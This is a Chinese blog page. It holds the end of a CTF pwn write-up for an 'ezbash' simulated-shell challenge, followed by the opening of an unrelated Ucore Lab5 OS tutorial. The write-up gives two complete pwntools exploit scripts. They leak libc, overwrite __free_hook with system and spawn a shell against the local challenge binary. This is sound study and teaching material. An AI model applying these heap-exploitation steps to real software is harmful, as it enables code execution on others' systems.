<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5628a05e16f0</span> <span class="comment">/* command_str释放前 */</span></span><br><span class="line">Size: <span class="number">0x6a1</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5628a05e1d90</span></span><br><span class="line">Size: <span class="number">0x6a1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5643db1456f0 <span class="comment">/* command_str释放后 */</span></span></span><br><span class="line"><span class="function">Size: 0x6a1</span></span><br><span class="line"><span class="function">fd: 0x7f6f82a6bbe0</span></span><br><span class="line"><span class="function">bk: 0x7f6f82a6bbe0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x5643db145d90</span></span><br><span class="line"><span class="function">Size: 0x6a0</span></span><br></pre></td></tr></table></figure>
<p>但程序的置空操作做的比较好，到处都有，不过有一处有点不完善：</p>
<ul>
<li>这个函数会根据 echo_data 已写入的长度来置空 echo_data，它并不会完全置空 echo_data</li>
</ul>
<p>接下来的思路就是：</p>
<ul>
<li>令一个“文件”调用 echo 命令，获取 unsortedbin</li>
<li>再次调用 echo 命令，修改 size 为一个较小值（至少不会覆盖 main_arena）</li>
<li>调用 cp 命令，在 copy_echo_s 中申请 unsortedbin（并且不会覆盖 main_arena）</li>
<li>最后调用 cat 命令进行打印</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">cd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x540</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">cp(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">cat(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr<span class="number">-2018272</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>然后怎么 getshell 呢？这个问题为想了很久，当时就感觉 cp 命令有问题（其他命令都仔细检查过了），然后就摆了……</p>
<p>最后同期那个兄弟打出来了，利用了 realloc 的性质和又一处逻辑漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( name_list1-&gt;echo_data &amp;&amp; name_list2-&gt;echo_data )<span class="comment">// 如果两者都存在</span></span><br><span class="line">&#123;</span><br><span class="line">  len1 = <span class="built_in">strlen</span>(name_list1-&gt;echo_data);</span><br><span class="line">  len2 = <span class="built_in">strlen</span>(name_list2-&gt;echo_data);</span><br><span class="line">  <span class="keyword">if</span> ( len1 &gt; len2 )</span><br><span class="line">  &#123;</span><br><span class="line">    name_list_temp2 = (Chunk *)<span class="built_in">realloc</span>(name_list2-&gt;echo_data, len1 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name_list_temp2-&gt;echo_data, <span class="number">0</span>, len1 + <span class="number">1</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(name_list2-&gt;echo_data, <span class="number">0</span>, len2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(name_list_temp2-&gt;echo_data, name_list1-&gt;echo_data, len1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序原本想重新分配“name_list2-&gt;echo_data”，然后把“name_list1-&gt;echo_data”复制过来</li>
<li>但是作者把代码写错了（不知道是不是故意的），导致“name_list1-&gt;echo_data”被复制到了“name_list_temp2-&gt;echo_data”，也就是“name_list2-&gt;echo_data-&gt;echo_data”</li>
<li>而“name_list_temp2-&gt;echo_data”这个位置是可以控制的（“name_list_temp2+0x18”）</li>
</ul>
<p>看看实现的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*(<span class="number">0x30</span>-<span class="number">1</span>-<span class="number">6</span>)+p64(system_libc)[:-<span class="number">2</span>],<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 不一定是0x30,只要保证len1&gt;len2就好</span></span><br><span class="line">echo(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x18</span>+p64(free_hook-(<span class="number">0x30</span>-<span class="number">1</span>-<span class="number">6</span>))[:-<span class="number">2</span>],<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">cp(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意：因为我们需要输入“echo xxx -&gt; 1”这样一个字符串，所以“xxx”不能包含“\x00”</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cd</span>(<span class="params">path</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;cd&#x27;</span>+<span class="string">&#x27; &#x27;</span>+path)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>+<span class="string">&#x27; &#x27;</span>+name)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;touch&#x27;</span>+<span class="string">&#x27; &#x27;</span>+name)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">data,name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;echo &#x27;</span>+data+<span class="string">&#x27; -&gt; &#x27;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">name,key</span>):</span></span><br><span class="line">	<span class="keyword">if</span> key ==<span class="number">1</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>+<span class="string">&#x27; &#x27;</span>+name)</span><br><span class="line">	<span class="keyword">if</span> key ==<span class="number">0</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;rm -r&#x27;</span>+<span class="string">&#x27; &#x27;</span>+name)</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cp</span>(<span class="params">name1,name2</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;cp &#x27;</span>+<span class="string">&#x27; &#x27;</span>+name1+<span class="string">&#x27; &#x27;</span>+name2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>+<span class="string">&#x27; &#x27;</span>+name)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x2842)\nb *$rebase(0x33BC)\nb *$rebase(0x2148)\nb *$rebase(0x2695)\nb *$rebase(0x235C)\nb *$rebase(0x1483)\nb *$rebase(0x18E0)&quot;)</span></span><br><span class="line"></span><br><span class="line">mkdir(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">cd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x540</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">cp(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">cat(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">2018272</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line">system_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line"></span><br><span class="line">one_gadget_list=[<span class="number">0xe3b2e</span>,<span class="number">0xe3b31</span>,<span class="number">0xe3b34</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">0</span>]+libc_base</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">cd(<span class="string">&#x27;..&#x27;</span>)</span><br><span class="line">rm(<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&#x27;1&#x27;</span>*(<span class="number">0x30</span>-<span class="number">1</span>-<span class="number">6</span>)+p64(system_libc)[:-<span class="number">2</span>],<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">echo(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x18</span>+p64(free_hook-(<span class="number">0x30</span>-<span class="number">1</span>-<span class="number">6</span>))[:-<span class="number">2</span>],<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cp(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后挂一下官方wp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = process(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x : r.sendlineafter(<span class="string">&#x27;hacker:/$ &#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;touch &quot;</span>+<span class="string">&quot;AAA&quot;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;touch &quot;</span>+<span class="string">&quot;BBB&quot;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;touch &quot;</span>+<span class="string">&quot;CCC&quot;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;echo &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span>+<span class="string">&quot; -&gt; &quot;</span>+<span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;cp AAA BBB&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;echo &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf8</span></span><br><span class="line">p = p.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">p+= p16(<span class="number">0x431</span>)</span><br><span class="line">p = p.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">p+= <span class="string">&#x27; -&gt; &#x27;</span>+<span class="string">&#x27;CCC&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	p = <span class="string">&quot;touch &quot;</span>+<span class="string">&quot;pad&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">	sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;cp CCC BBB&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;rm CCC&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;echo &#x27;</span>.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">p+= p8(<span class="number">0xd0</span>)</span><br><span class="line">p = p.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line">p+= <span class="string">&#x27; -&gt; &#x27;</span></span><br><span class="line">p+= <span class="string">&#x27;BBB&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;cp BBB pad9&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;cat pad9&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-\</span><br><span class="line"><span class="number">1104</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">p = <span class="string">&#x27;rm pad0&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x130</span></span><br><span class="line">p+= p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">p+= p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">4</span>)</span><br><span class="line">p+= p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x51</span>)+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;touch final1\x00&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;echo /bin/sh -&gt; final1&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;touch &#x27;</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;rm final1&#x27;</span></span><br><span class="line">sla(p)</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题搞得我很痛苦，但也确实有点意思</p>
<p>我分析完了这个题目所有的代码，也弄清楚这种模拟 bash 是怎么写的了，于是我打算尝试自己写一个（一定是没有BUG的）</p>
<p>当时没有做出来，感觉漏洞就在 cp/echo 命令那一块，但就是找不到，最后看到漏洞点后还是比较失望的，就是一处逻辑错误</p>
<p>以前就是菜单题做的多，基于 UAF 或者 off-by-one 的这样一个小点施展各种 house of，像这种有着特定功能的题目没有遇到几次（这次算是最复杂了的吧），想到在以后的工作环境中，这种逻辑错误应该会经常遇到，而 UAF，off-by-one 可能会遇到的少一点</p>
<p>最后感觉自己的 coding 能力不够吧，如果我可以自己写 bash 的话，这种漏洞很容易就可以找出来</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/22/Ucore-Lab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/22/Ucore-Lab5/" class="post-title-link" itemprop="url">Ucore-Lab5</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-22 02:32:18" itemprop="dateCreated datePublished" datetime="2022-04-22T02:32:18+08:00">2022-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-03 23:09:57" itemprop="dateModified" datetime="2022-05-03T23:09:57+08:00">2022-05-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验简述"><a href="#实验简述" class="headerlink" title="实验简述"></a>实验简述</h2><ul>
<li>了解第一个用户进程创建过程</li>
<li>了解系统调用框架的实现机制</li>
<li>了解ucore如何实现系统调用 sys_fork，sys_exec，sys_exit，sys_wait 来进行进程管理 </li>
</ul>
<p>ucore在lab4中实现了进程/线程机制，能够创建并进行内核线程的调度，通过上下文的切换令线程分时的获得CPU，使得不同线程能够并发的运行</p>
<p>在lab5中需要更进一步，实现我们平常开发接触到的、运行在用户态的进程/线程机制</p>
<ul>
<li>用户线程通常用于承载和运行应用程序，为了保护操作系统内核，避免其被不够鲁棒的应用程序破坏，应用程序都运行在 <strong>低特权级</strong> 中，无法直接访问 <strong>高特权级</strong> 的内核数据结构，也无法通过程序指令直接的访问各种外设</li>
<li>但应用程序访问高特权级数据、外设的需求是不可避免的，因此ucore在lab5中也实现了 <strong>系统调用机制</strong> ，应用程序平常运行在用户态，在有需要时可以通过系统调用的方式间接的访问外设等受到保护的资源</li>
</ul>
<p>在ucore lab5中，提供了一些用户态的demo应用程序，并在内核实现了诸如 fork、exit、kill、yield、wait 等等系统调用功能以及C实现的应用程序系统调用库</p>
<p>通过lab5的学习，可以更深入的了解操作系统中用户态应用程序的加载、运行和退出机制，以及系统调用的工作原理</p>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><ul>
<li>系统调用是操作系统提供的一种特殊api接口，底层是通过中断实现的，应用程序调用系统中断时，其CPL特权级会被暂时的提升到ring0，因此便获得了访问外设、内核数据的能力</li>
<li>这一提升CPL特权级从外层用户态到里层内核态的过程，也被称为陷入内核，系统调用会陷入内核，但是陷入内核的方式除了系统调用外，还包括触发保护异常等</li>
<li>由于系统调用是操作系统的开发人员精心设计的，且对传入的参数等等有着很严格的控制，确保了系统调用不会对内核造成破坏，同时，在系统调用中断返回时，也会将其CPL特权级对应用程序透明的还原到用户态</li>
</ul>
<h2 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h2><p>因为后续要分析ELF文件加载到进程的过程，所以我们先了解一下ELF文件的结构（这里我们主要关注一下<strong>执行视图</strong>）</p>
<img src="/2022/04/22/Ucore-Lab5/1650532343081-1650638303745.png" class width="1650532343081"> 
<p>值得注意的这一点是：</p>
<ul>
<li><strong>ELF头部</strong> 和 <strong>程序头部表</strong> 是两个不同的东西</li>
<li>前者用于描述整个 ELF 文件的信息</li>
<li>后者是一个结构体数组，数组中的每个结构体元素是一个段表头（program header），每个程序头描述一个段（segment）</li>
</ul>
<h2 id="进程-amp-文件-amp-段"><a href="#进程-amp-文件-amp-段" class="headerlink" title="进程&amp;文件&amp;段"></a>进程&amp;文件&amp;段</h2><p><strong>描述进程</strong></p>
<p>proc_struct 结构体专门用于描述进程的状态：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>      <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                   <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;           <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched; <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span> <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 保存的进程上下文,用于进程切换</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>       <span class="comment">// 中断帧指针,指向内核栈的某个位置(保存有中断上下文)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 